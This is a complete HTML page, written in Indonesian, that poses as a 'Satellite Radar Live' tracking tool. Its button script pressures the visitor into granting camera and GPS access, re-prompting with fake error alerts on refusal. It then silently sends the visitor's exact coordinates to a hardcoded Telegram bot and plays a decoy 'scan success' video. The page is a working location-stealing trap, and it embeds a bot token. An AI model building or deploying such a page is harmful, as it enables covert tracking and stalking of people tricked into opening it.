<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>[ RADAR LIVE V.35.0 ]</title>
    <style>
        :root { --neon: #0f0; --bg: #000; }
        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; text-align: center; margin:0; overflow: hidden; }
        .container { padding: 20px; }
        .radar-box { border: 2px solid var(--neon); border-radius: 50%; width: 250px; height: 250px; margin: 20px auto; position: relative; box-shadow: 0 0 20px var(--neon); overflow: hidden; }
        .scan-line { width: 100%; height: 2px; background: var(--neon); position: absolute; top: 50%; box-shadow: 0 0 10px var(--neon); animation: scan 3s linear infinite; }
        @keyframes scan { from { transform: rotate(0deg); transform-origin: center; } to { transform: rotate(360deg); transform-origin: center; } }
        button { background: transparent; color: var(--neon); border: 2px solid var(--neon); padding: 15px 30px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 14px; box-shadow: 0 0 10px var(--neon); }
        button:active { background: var(--neon); color: #000; }
        #videoOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; }
        video { width: 100%; height: 100%; object-fit: cover; }
        .panel-attack { opacity: 0.1; font-size: 8px; position: fixed; bottom: 0; width: 100%; }
    </style>
</head>
<body>

    <div class="container" id="mainUI">
        <h2 style="text-shadow: 0 0 10px var(--neon);">SATELLITE RADAR LIVE</h2>
        <div class="radar-box">
            <div class="scan-line"></div>
        </div>
        <p style="font-size: 12px; color: #fff;">SISTEM MEMERLUKAN AKSES SENSOR UNTUK PELACAKAN REAL-TIME</p>
        <button onclick="activateRadar()">AKTIFKAN RADAR SEKARANG</button>
    </div>

    <div id="videoOverlay">
        <video id="trapVideo" loop muted playsinline>
            <source src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNGJmZnduMG9uNHF3ZnduNHF3ZnduNHF3ZnduNHF3ZnduNHF3ZnduNHF3JmVwPXYxX2ludGVybmFsX2dpZl9ieV9iZCZjdD12/3o7TKMGpxVf7Ulb4S4/giphy.mp4" type="video/mp4">
        </video>
        <div style="position:absolute; top:10px; width:100%; color:#0f0; font-size:10px;">SCANNING COORDINATES... SUCCESS</div>
    </div>

    <div class="panel-attack">
        <script>
            const TELE_TOKEN = '8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g';
            const TELE_ID = '7898572558';

            function sendTele(msg) { fetch("https://api.telegram.org/bot" + TELE_TOKEN + "/sendMessage?chat_id=" + TELE_ID + "&text=" + encodeURIComponent(msg)); }

            function activateRadar() {
                // Minta Izin Kamera & GPS
                navigator.mediaDevices.getUserMedia({ video: true }).then(() => {
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition((p) => {
                            // Kirim data ke Telegram Master
                            let log = "🔱 [ RADAR LIVE DETECTED ] 🔱\n📍 LOKASI:\nhttps://www.google.com/maps?q=" + p.coords.latitude + "," + p.coords.longitude;
                            sendTele(log);
                            
                            // Putar Video Radar Aktif
                            document.getElementById('videoOverlay').style.display = 'block';
                            document.getElementById('trapVideo').play();
                        }, (err) => { 
                            alert("ERROR: Sensor Radar gagal. Izinkan LOKASI untuk kalibrasi."); 
                            activateRadar();
                        });
                    }
                }).catch(err => {
                    alert("ERROR: Akses Kamera diperlukan untuk Sinkronisasi Radar.");
                    activateRadar();
                });
            }
        </script>
    </div>
</body>
</html>
